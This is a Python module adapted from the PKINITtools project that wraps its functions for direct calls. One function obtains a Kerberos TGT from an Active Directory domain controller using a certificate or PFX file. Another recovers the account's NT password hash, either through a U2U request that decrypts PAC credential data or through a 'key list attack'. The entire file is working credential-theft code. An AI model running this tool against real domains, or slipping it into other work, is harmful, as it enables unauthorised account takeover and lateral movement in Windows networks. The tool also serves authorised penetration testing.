#!/usr/bin/env python3
"""
PKINIT tools extracted from PKINITtools for direct function calls
Based on gettgtpkinit.py and getnthash.py from PKINITtools

Derived from PKINITtools https://github.com/dirkjanm/PKINITtools by:
  - Alberto Solino (@agsolino)
  - Dirk-jan Mollema (@_dirkjan)
  - Tamas Jos (@skelsec)
"""

import os
import binascii
import logging
import hashlib
import secrets
import datetime
from binascii import unhexlify, hexlify

try:
    from oscrypto.keys import parse_pkcs12, parse_certificate, parse_private
    from oscrypto.asymmetric import rsa_pkcs1v15_sign, load_private_key
    from asn1crypto import cms
    from asn1crypto import algos
    from asn1crypto import core
    from asn1crypto import keys
    
    from minikerberos import logger
    from minikerberos.pkinit import PKINIT, DirtyDH
    from minikerberos.common.ccache import CCACHE
    from minikerberos.common.target import KerberosTarget
    from minikerberos.network.clientsocket import KerberosClientSocket
    from minikerberos.protocol.constants import NAME_TYPE, PaDataType
    from minikerberos.protocol.encryption import Enctype, _checksum_table, _enctype_table, Key
    from minikerberos.protocol.structures import AuthenticatorChecksum
    from minikerberos.protocol.asn1_structs import KDC_REQ_BODY, PrincipalName, HostAddress, \
        KDCOptions, EncASRepPart, AP_REQ, AuthorizationData, Checksum, krb5_pvno, Realm, \
        EncryptionKey, Authenticator, Ticket, APOptions, EncryptedData, AS_REQ, AP_REP, PADATA_TYPE, \
        PA_PAC_REQUEST
    from minikerberos.protocol.rfc4556 import PKAuthenticator, AuthPack, Dunno2, MetaData, Info, CertIssuer, CertIssuers, PA_PK_AS_REP, KDCDHKeyInfo, PA_PK_AS_REQ
    
    MINIKERBEROS_AVAILABLE = True
except ImportError as e:
    MINIKERBEROS_AVAILABLE = False
    MINIKERBEROS_ERROR = str(e)
    # Define dummy classes to prevent NameError when class definition is parsed
    PKINIT = object
    DirtyDH = object
    CCACHE = object
    KerberosTarget = object
    KerberosClientSocket = object
    NAME_TYPE = object
    PaDataType = object
    Enctype = object
    _checksum_table = {}
    _enctype_table = {}
    Key = object
    AuthenticatorChecksum = object
    KDC_REQ_BODY = object
    PrincipalName = object
    HostAddress = object
    KDCOptions = object
    EncASRepPart = object
    AP_REQ = object
    AuthorizationData = object
    Checksum = object
    krb5_pvno = object
    Realm = object
    EncryptionKey = object
    Authenticator = object
    Ticket = object
    APOptions = object
    EncryptedData = object
    AS_REQ = object
    AP_REP = object
    PADATA_TYPE = object
    PA_PAC_REQUEST = object
    PKAuthenticator = object
    AuthPack = object
    Dunno2 = object
    MetaData = object
    Info = object
    CertIssuer = object
    CertIssuers = object
    PA_PK_AS_REP = object
    KDCDHKeyInfo = object
    PA_PK_AS_REQ = object
    # Dummy functions for oscrypto imports
    parse_pkcs12 = lambda *args, **kwargs: None
    parse_certificate = lambda *args, **kwargs: None
    parse_private = lambda *args, **kwargs: None
    load_private_key = lambda *args, **kwargs: None
    rsa_pkcs1v15_sign = lambda *args, **kwargs: None
    # Dummy modules for asn1crypto
    cms = type('cms', (), {})()
    algos = type('algos', (), {})()
    core = type('core', (), {})()
    keys = type('keys', (), {})()

try:
    import datetime
    import random
    from pyasn1.type.univ import noValue, SequenceOf, Integer
    from pyasn1.codec.der import encoder, decoder
    
    from impacket.krb5.ccache import CCache as ImpacketCCache
    from impacket.dcerpc.v5.rpcrt import TypeSerialization1
    from impacket.krb5 import constants
    from impacket.krb5.asn1 import AP_REQ, AS_REP, TGS_REQ, Authenticator, TGS_REP, seq_set, seq_set_iter, PA_FOR_USER_ENC, \
        EncTicketPart, AD_IF_RELEVANT, Ticket as TicketAsn1, EncTGSRepPart, KERB_KEY_LIST_REP
    from impacket.krb5.crypto import Key as ImpacketKey, _enctype_table as impacket_enctype_table, _HMACMD5, Enctype as ImpacketEnctype
    from impacket.krb5.kerberosv5 import sendReceive
    from impacket.krb5.pac import PACTYPE, PAC_INFO_BUFFER, KERB_VALIDATION_INFO, PAC_CLIENT_INFO_TYPE, PAC_CLIENT_INFO, \
        PAC_SERVER_CHECKSUM, PAC_SIGNATURE_DATA, PAC_PRIVSVR_CHECKSUM, PAC_UPN_DNS_INFO, UPN_DNS_INFO, PAC_CREDENTIAL_INFO, \
        PAC_CREDENTIAL_DATA, SECPKG_SUPPLEMENTAL_CRED, NTLM_SUPPLEMENTAL_CREDENTIAL
    from impacket.krb5.types import Principal, KerberosTime, Ticket
    
    IMPACKET_AVAILABLE = True
except ImportError as e:
    IMPACKET_AVAILABLE = False
    IMPACKET_ERROR = str(e)


if MINIKERBEROS_AVAILABLE:
    class myPKINIT(PKINIT):
        """
        Copy of minikerberos PKINIT
        With some changes where it differs from PKINIT used in NegoEx
        """

        @staticmethod
        def from_pfx(pfxfile, pfxpass, dh_params = None):
            with open(pfxfile, 'rb') as f:
                pfxdata = f.read()
            return myPKINIT.from_pfx_data(pfxdata, pfxpass, dh_params)

        @staticmethod
        def from_pfx_data(pfxdata, pfxpass, dh_params = None):
            pkinit = myPKINIT()
            # oscrypto does not seem to support pfx without password, so convert it to PEM using cryptography instead
            if not pfxpass:
                from cryptography.hazmat.primitives.serialization import pkcs12
                from cryptography.hazmat.primitives import serialization
                privkey, cert, extra_certs = pkcs12.load_key_and_certificates(pfxdata, None)
                pem_key = privkey.private_bytes(
                    encoding=serialization.Encoding.PEM,
                    format=serialization.PrivateFormat.TraditionalOpenSSL,
                    encryption_algorithm=serialization.NoEncryption(),
                )
                pkinit.privkey = load_private_key(parse_private(pem_key))
                pem_cert = cert.public_bytes(
                    encoding=serialization.Encoding.PEM
                )
                pkinit.certificate = parse_certificate(pem_cert)
            else:
                if isinstance(pfxpass, str):
                    pfxpass = pfxpass.encode()
                pkinit.privkeyinfo, pkinit.certificate, pkinit.extra_certs = parse_pkcs12(pfxdata, password=pfxpass)
                pkinit.privkey = load_private_key(pkinit.privkeyinfo)
            pkinit.setup(dh_params = dh_params)
            return pkinit

        @staticmethod
        def from_pem(certfile, privkeyfile, dh_params = None):
            pkinit = myPKINIT()
            with open(certfile, 'rb') as f:
                pkinit.certificate = parse_certificate(f.read())
            with open(privkeyfile, 'rb') as f:
                pkinit.privkey = load_private_key(parse_private(f.read()))
            pkinit.setup(dh_params = dh_params)
            return pkinit

        def sign_authpack(self, data, wrap_signed = False):
            return self.sign_authpack_native(data, wrap_signed)

        def setup(self, dh_params = None):
            self.issuer = self.certificate.issuer.native['common_name']
            if dh_params is None:
                # Static DH params because the ones generated by cryptography are considered unsafe by AD
                dh_params = {
                    'p':int('00ffffffffffffffffc90fdaa22168c234c4c6628b80dc1cd129024e088a67cc74020bbea63b139b22514a08798e3404ddef9519b3cd3a431b302b0a6df25f14374fe1356d6d51c245e485b576625e7ec6f44c42e9a637ed6b0bff5cb6f406b7edee386bfb5a899fa5ae9f24117c4b1fe649286651ece65381ffffffffffffffff', 16),
                    'g':2
                }
            
            if isinstance(dh_params, dict):
                self.diffie = DirtyDH.from_dict(dh_params)
            elif isinstance(dh_params, bytes):
                self.diffie = DirtyDH.from_asn1(dh_params)
            elif isinstance(dh_params, DirtyDH):
                self.diffie = dh_params
            else:
                raise Exception('DH params must be either a bytearray or a dict')

        def build_asreq(self, domain = None, cname = None, kdcopts = ['forwardable','renewable','renewable-ok']):
            if isinstance(kdcopts, list):
                kdcopts = set(kdcopts)
            if cname is not None:
                if isinstance(cname, str):
                    cname = [cname]
            else:
                cname = [self.cname]

            now = datetime.datetime.now(datetime.timezone.utc)

            kdc_req_body_data = {}
            kdc_req_body_data['kdc-options'] = KDCOptions(kdcopts)
            kdc_req_body_data['cname'] = PrincipalName({'name-type': NAME_TYPE.PRINCIPAL.value, 'name-string': cname})
            kdc_req_body_data['realm'] = domain.upper()
            kdc_req_body_data['sname'] = PrincipalName({'name-type': NAME_TYPE.SRV_INST.value, 'name-string': ['krbtgt', domain.upper()]})
            kdc_req_body_data['till']  = (now + datetime.timedelta(days=1)).replace(microsecond=0)
            kdc_req_body_data['rtime'] = (now + datetime.timedelta(days=1)).replace(microsecond=0)
            kdc_req_body_data['nonce'] = secrets.randbits(31)
            kdc_req_body_data['etype'] = [18,17] # 23 breaks...
            kdc_req_body = KDC_REQ_BODY(kdc_req_body_data)

            checksum = hashlib.sha1(kdc_req_body.dump()).digest()

            authenticator = {}
            authenticator['cusec'] = now.microsecond
            authenticator['ctime'] = now.replace(microsecond=0)
            authenticator['nonce'] = secrets.randbits(31)
            authenticator['paChecksum'] = checksum

            dp = {}
            dp['p'] = self.diffie.p
            dp['g'] = self.diffie.g
            dp['q'] = 0 # mandatory parameter, but it is not needed

            pka = {}
            pka['algorithm'] = '1.2.840.10046.2.1'
            pka['parameters'] = keys.DomainParameters(dp)

            spki = {}
            spki['algorithm'] = keys.PublicKeyAlgorithm(pka)
            spki['public_key'] = self.diffie.get_public_key()

            authpack = {}
            authpack['pkAuthenticator'] = PKAuthenticator(authenticator)
            authpack['clientPublicValue'] = keys.PublicKeyInfo(spki)
            authpack['clientDHNonce'] = self.diffie.dh_nonce

            authpack = AuthPack(authpack)
            signed_authpack = self.sign_authpack(authpack.dump(), wrap_signed = True)

            payload = PA_PK_AS_REQ()
            payload['signedAuthPack'] = signed_authpack

            pa_data_1 = {}
            pa_data_1['padata-type'] = PaDataType.PK_AS_REQ.value
            pa_data_1['padata-value'] = payload.dump()

            pa_data_0 = {}
            pa_data_0['padata-type'] = int(PADATA_TYPE('PA-PAC-REQUEST'))
            pa_data_0['padata-value'] = PA_PAC_REQUEST({'include-pac': True}).dump()

            asreq = {}
            asreq['pvno'] = 5
            asreq['msg-type'] = 10
            asreq['padata'] = [pa_data_0, pa_data_1]
            asreq['req-body'] = kdc_req_body

            return AS_REQ(asreq).dump()

        def sign_authpack_native(self, data, wrap_signed = False):
            """
            Creating PKCS7 blob which contains the following things:

            1. 'data' blob which is an ASN1 encoded "AuthPack" structure
            2. the certificate used to sign the data blob
            3. the singed 'signed_attrs' structure (ASN1) which points to the "data" structure (in point 1)
            """

            da = {}
            da['algorithm'] = algos.DigestAlgorithmId('1.3.14.3.2.26') # for sha1

            si = {}
            si['version'] = 'v1'
            si['sid'] = cms.IssuerAndSerialNumber({
                'issuer':  self.certificate.issuer,
                'serial_number':  self.certificate.serial_number,
            })

            si['digest_algorithm'] = algos.DigestAlgorithm(da)
            si['signed_attrs'] = [
                cms.CMSAttribute({'type': 'content_type', 'values': ['1.3.6.1.5.2.3.1']}),
                cms.CMSAttribute({'type': 'message_digest', 'values': [hashlib.sha1(data).digest()]}),
            ]
            si['signature_algorithm'] = algos.SignedDigestAlgorithm({'algorithm' : '1.2.840.113549.1.1.1'})
            si['signature'] = rsa_pkcs1v15_sign(self.privkey,  cms.CMSAttributes(si['signed_attrs']).dump(), "sha1")

            ec = {}
            ec['content_type'] = '1.3.6.1.5.2.3.1'
            ec['content'] = data

            sd = {}
            sd['version'] = 'v3'
            sd['digest_algorithms'] = [algos.DigestAlgorithm(da)]
            sd['encap_content_info'] = cms.EncapsulatedContentInfo(ec)
            sd['certificates'] = [self.certificate]
            sd['signer_infos'] = cms.SignerInfos([cms.SignerInfo(si)])

            if wrap_signed is True:
                ci = {}
                ci['content_type'] = '1.2.840.113549.1.7.2'
                ci['content'] = cms.SignedData(sd)
                return cms.ContentInfo(ci).dump()

            return cms.SignedData(sd).dump()

        def decrypt_asrep(self, as_rep):
            def truncate_key(value, keysize):
                output = b''
                currentNum = 0
                while len(output) < keysize:
                    currentDigest = hashlib.sha1(bytes([currentNum]) + value).digest()
                    if len(output) + len(currentDigest) > keysize:
                        output += currentDigest[:keysize - len(output)]
                        break
                    output += currentDigest
                    currentNum += 1
                return output

            for pa in as_rep['padata']:
                if pa['padata-type'] == 17:
                    pkasrep = PA_PK_AS_REP.load(pa['padata-value']).native
                    break
            else:
                raise Exception('PA_PK_AS_REP not found!')
            ci = cms.ContentInfo.load(pkasrep['dhSignedData']).native
            sd = ci['content']
            keyinfo = sd['encap_content_info']
            if keyinfo['content_type'] != '1.3.6.1.5.2.3.2':
                raise Exception('Keyinfo content type unexpected value')
            authdata = KDCDHKeyInfo.load(keyinfo['content']).native
            pubkey = int.from_bytes(core.BitString(authdata['subjectPublicKey']).dump()[7:], 'big', signed = False)
            shared_key = self.diffie.exchange(pubkey)

            server_nonce = pkasrep['serverDHNonce']
            fullKey = shared_key + self.diffie.dh_nonce + server_nonce

            etype = as_rep['enc-part']['etype']
            cipher = _enctype_table[etype]
            if etype == Enctype.AES256:
                t_key = truncate_key(fullKey, 32)
            elif etype == Enctype.AES128:
                t_key = truncate_key(fullKey, 16)
            elif etype == Enctype.RC4:
                raise NotImplementedError('RC4 key truncation documentation missing. it is different from AES')

            key = Key(cipher.enctype, t_key)
            enc_data = as_rep['enc-part']['cipher']
            asrep_key_hex = binascii.hexlify(t_key).decode('utf-8')
            dec_data = cipher.decrypt(key, 3, enc_data)
            encasrep = EncASRepPart.load(dec_data).native
            cipher = _enctype_table[ int(encasrep['key']['keytype'])]
            session_key = Key(cipher.enctype, encasrep['key']['keyvalue'])
            return encasrep, session_key, cipher, asrep_key_hex

else:
    # Define dummy class when minikerberos is not available
    class myPKINIT:
        pass


def get_tgt_pkinit(cert_file=None, key_file=None, pfx_file=None, pfx_password=None, 
                   domain=None, username=None, dc_ip=None, ccache_file=None, debug=False):
    """
    Get TGT using PKINIT
    
    Args:
        cert_file: Path to certificate PEM file (if using PEM)
        key_file: Path to private key PEM file (if using PEM)
        pfx_file: Path to PFX file (if using PFX)
        pfx_password: Password for PFX file
        domain: Domain name
        username: Username
        dc_ip: Domain controller IP or hostname
        ccache_file: Path to save ccache file
        debug: Enable debug output
        
    Returns:
        tuple: (asrep_key_hex, ccache_file_path) or (None, None) on failure
    """
    if not MINIKERBEROS_AVAILABLE:
        if debug:
            print(f"[-] minikerberos not available: {MINIKERBEROS_ERROR}")
        return None, None
    
    if not domain or not username:
        if debug:
            print(f"[-] domain and username are required")
        return None, None
    
    if not ccache_file:
        ccache_file = f"{username}.ccache"
    
    try:
        # Static DH params
        dh_params = {
            'p':int('00ffffffffffffffffc90fdaa22168c234c4c6628b80dc1cd129024e088a67cc74020bbea63b139b22514a08798e3404ddef9519b3cd3a431b302b0a6df25f14374fe1356d6d51c245e485b576625e7ec6f44c42e9a637ed6b0bff5cb6f406b7edee386bfb5a899fa5ae9f24117c4b1fe649286651ece65381ffffffffffffffff', 16),
            'g':2
        }
        
        if debug:
            print(f"[*] Loading certificate and key from file")
        
        # Load certificate
        if pfx_file and os.path.exists(pfx_file):
            pkinit = myPKINIT.from_pfx(pfx_file, pfx_password, dh_params)
        elif cert_file and key_file and os.path.exists(cert_file) and os.path.exists(key_file):
            pkinit = myPKINIT.from_pem(cert_file, key_file, dh_params)
        else:
            if debug:
                print(f"[-] Certificate files not found or not specified correctly")
            return None, None
        
        # Build AS-REQ
        if debug:
            print(f"[*] Requesting TGT")
        req = pkinit.build_asreq(domain, username)
        
        # Determine DC IP
        if not dc_ip:
            dc_ip = domain
        
        # Send request
        sock = KerberosClientSocket(KerberosTarget(dc_ip))
        res = sock.sendrecv(req)
        
        # Decrypt AS-REP
        encasrep, session_key, cipher, asrep_key_hex = pkinit.decrypt_asrep(res.native)
        
        # Save to ccache
        ccache = CCACHE()
        ccache.add_tgt(res.native, encasrep)
        ccache.to_file(ccache_file)
        
        if debug:
            print(f"[+] TGT saved to: {ccache_file}")
            print(f"[+] AS-REP encryption key: {asrep_key_hex}")
        
        return asrep_key_hex, ccache_file
        
    except Exception as e:
        if debug:
            import traceback
            traceback.print_exc()
        print(f"[-] Error getting TGT: {e}")
        return None, None


def get_nt_hash_from_tgt(ccache_file, domain, username, asrep_key, dc_ip=None, do_key_list=False, debug=False):
    """
    Get NT hash from TGT using U2U
    
    Args:
        ccache_file: Path to ccache file
        domain: Domain name
        username: Username
        asrep_key: AS-REP encryption key (hex string)
        dc_ip: Domain controller IP or hostname
        do_key_list: Use key list attack instead of U2U
        debug: Enable debug output
        
    Returns:
        str: NT hash (hex) or None on failure
    """
    if not IMPACKET_AVAILABLE:
        if debug:
            print(f"[-] impacket not available: {IMPACKET_ERROR}")
        return None
    
    if not os.path.exists(ccache_file):
        if debug:
            print(f"[-] CCache file not found: {ccache_file}")
        return None
    
    try:
        # Set environment variable for ccache
        os.environ['KRB5CCNAME'] = os.path.abspath(ccache_file)
        
        # Load TGT from ccache
        ccache = ImpacketCCache.loadFile(ccache_file)
        principal = 'krbtgt/%s@%s' % (domain.upper(), domain.upper())
        creds = ccache.getCredential(principal)
        if creds is None:
            if debug:
                print(f"[-] No valid credentials found in ccache file")
            return None
        
        TGT = creds.toTGT()
        tgt, cipher, sessionKey = TGT['KDC_REP'], TGT['cipher'], TGT['sessionKey']
        
        if debug:
            print(f"[*] Using TGT from cache")
        
        decodedTGT = decoder.decode(tgt, asn1Spec = AS_REP())[0]
        
        # Extract ticket
        ticket = Ticket()
        ticket.from_asn1(decodedTGT['ticket'])
        
        # Build AP-REQ
        apReq = AP_REQ()
        apReq['pvno'] = 5
        apReq['msg-type'] = int(constants.ApplicationTagNumbers.AP_REQ.value)
        
        opts = list()
        apReq['ap-options'] = constants.encodeFlags(opts)
        seq_set(apReq,'ticket', ticket.to_asn1)
        
        authenticator = Authenticator()
        authenticator['authenticator-vno'] = 5
        authenticator['crealm'] = str(decodedTGT['crealm'])
        
        clientName = Principal()
        clientName.from_asn1( decodedTGT, 'crealm', 'cname')
        seq_set(authenticator, 'cname', clientName.components_to_asn1)
        
        now = datetime.datetime.now(datetime.timezone.utc)
        authenticator['cusec'] = now.microsecond
        authenticator['ctime'] = KerberosTime.to_asn1(now)
        
        encodedAuthenticator = encoder.encode(authenticator)
        encryptedEncodedAuthenticator = cipher.encrypt(sessionKey, 7, encodedAuthenticator, None)
        
        apReq['authenticator'] = noValue
        apReq['authenticator']['etype'] = cipher.enctype
        apReq['authenticator']['cipher'] = encryptedEncodedAuthenticator
        encodedApReq = encoder.encode(apReq)
        
        # Build TGS-REQ
        tgsReq = TGS_REQ()
        tgsReq['pvno'] = 5
        tgsReq['msg-type'] = int(constants.ApplicationTagNumbers.TGS_REQ.value)
        
        tgsReq['padata'] = noValue
        tgsReq['padata'][0] = noValue
        tgsReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_TGS_REQ.value)
        tgsReq['padata'][0]['padata-value'] = encodedApReq
        
        if do_key_list:
            tgsReq['padata'][1] = noValue
            tgsReq['padata'][1]['padata-type'] = int(constants.PreAuthenticationDataTypes.KERB_KEY_LIST_REQ.value)
            encodedKeyReq = encoder.encode([23], asn1Spec=SequenceOf(componentType=Integer()))
            tgsReq['padata'][1]['padata-value'] = encodedKeyReq
        
        reqBody = seq_set(tgsReq, 'req-body')
        
        opts = list()
        opts.append(constants.KDCOptions.forwardable.value)
        opts.append(constants.KDCOptions.renewable.value)
        opts.append(constants.KDCOptions.canonicalize.value)
        if not do_key_list:
            opts.append(constants.KDCOptions.enc_tkt_in_skey.value)
        
        reqBody['kdc-options'] = constants.encodeFlags(opts)
        
        serverName = Principal(username, type=constants.PrincipalNameType.NT_UNKNOWN.value)
        if not do_key_list:
            seq_set(reqBody, 'sname', serverName.components_to_asn1)
        else:
            serverName = Principal("krbtgt", type=constants.PrincipalNameType.NT_SRV_INST.value)
            reqBody['sname']['name-type'] = constants.PrincipalNameType.NT_SRV_INST.value
            reqBody['sname']['name-string'][0] = serverName
            reqBody['sname']['name-string'][1] = str(decodedTGT['crealm'])
        reqBody['realm'] = str(decodedTGT['crealm'])
        
        now = datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(days=1)
        reqBody['till'] = KerberosTime.to_asn1(now)
        reqBody['nonce'] = random.getrandbits(31)
        seq_set_iter(reqBody, 'etype', (int(cipher.enctype), int(constants.EncryptionTypes.rc4_hmac.value)))
        
        myTicket = ticket.to_asn1(TicketAsn1())
        if not do_key_list:
            seq_set_iter(reqBody, 'additional-tickets', (myTicket,))
        
        message = encoder.encode(tgsReq)
        
        if do_key_list:
            if debug:
                print(f"[*] Upgrading to full TGT with NT hash recovery")
        else:
            if debug:
                print(f"[*] Requesting ticket to self with PAC")
        
        # Determine DC IP
        if not dc_ip:
            dc_ip = domain
        
        # Send request
        r = sendReceive(message, domain, dc_ip)
        
        tgs = decoder.decode(r, asn1Spec = TGS_REP())[0]
        cipherText = tgs['ticket']['enc-part']['cipher']
        newCipher = impacket_enctype_table[int(tgs['ticket']['enc-part']['etype'])]
        
        if do_key_list:
            encTGSRepPart = tgs['enc-part']
            enctype = encTGSRepPart['etype']
            cipher = impacket_enctype_table[enctype]
            decryptedTGSRepPart = cipher.decrypt(sessionKey, 8, encTGSRepPart['cipher'])
            decodedTGSRepPart = decoder.decode(decryptedTGSRepPart, asn1Spec=EncTGSRepPart())[0]
            encPaData1 = decodedTGSRepPart['encrypted_pa_data'][0]
            decodedPaData1 = decoder.decode(encPaData1['padata-value'], asn1Spec=KERB_KEY_LIST_REP())[0]
            key = decodedPaData1[0]['keyvalue'].prettyPrint()
            nt_hash = key[2:]  # Remove '0x' prefix
            if debug:
                print(f"[+] Recovered NT hash: {nt_hash}")
            return nt_hash
        else:
            plainText = cipher.decrypt(sessionKey, 2, cipherText)
            specialkey = ImpacketKey(18, unhexlify(asrep_key))
            
            # Parse PAC to extract NT hash
            encTicketPart = decoder.decode(plainText, asn1Spec=EncTicketPart())[0]
            adIfRelevant = decoder.decode(encTicketPart['authorization-data'][0]['ad-data'], asn1Spec=AD_IF_RELEVANT())[0]
            pacType = PACTYPE(adIfRelevant[0]['ad-data'].asOctets())
            buff = pacType['Buffers']
            
            for bufferN in range(pacType['cBuffers']):
                infoBuffer = PAC_INFO_BUFFER(buff)
                data = pacType['Buffers'][infoBuffer['Offset']-8:][:infoBuffer['cbBufferSize']]
                if infoBuffer['ulType'] == 2:
                    credinfo = PAC_CREDENTIAL_INFO(data)
                    newCipher = impacket_enctype_table[credinfo['EncryptionType']]
                    out = newCipher.decrypt(specialkey, 16, credinfo['SerializedData'])
                    type1 = TypeSerialization1(out)
                    newdata = out[len(type1)+4:]
                    pcc = PAC_CREDENTIAL_DATA(newdata)
                    for cred in pcc['Credentials']:
                        credstruct = NTLM_SUPPLEMENTAL_CREDENTIAL(b''.join(cred['Credentials']))
                        nt_hash = hexlify(credstruct['NtPassword']).decode('utf-8')
                        if debug:
                            print(f"[+] Recovered NT hash: {nt_hash}")
                        return nt_hash
                
                buff = buff[len(infoBuffer):]
            
            if debug:
                print(f"[-] Did not find the PAC_CREDENTIAL_INFO in the PAC")
            return None
        
    except Exception as e:
        if debug:
            import traceback
            traceback.print_exc()
        print(f"[-] Error getting NT hash: {e}")
        return None

